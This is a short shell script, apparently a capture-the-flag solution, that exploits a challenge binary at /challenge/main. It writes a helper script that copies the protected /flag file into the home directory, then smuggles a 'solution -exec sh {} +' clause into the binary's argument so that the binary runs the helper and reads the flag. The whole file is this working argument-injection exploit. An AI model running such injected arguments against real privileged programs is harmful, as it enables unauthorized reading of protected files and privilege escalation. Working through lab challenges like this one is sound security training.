#!/bin/sh

echo '/usr/bin/cat /flag > ~/flag266666' > ~/solution
chmod +x ~/solution

cd /challenge
arg="solution -exec sh {} +"
./main \""$arg"\"
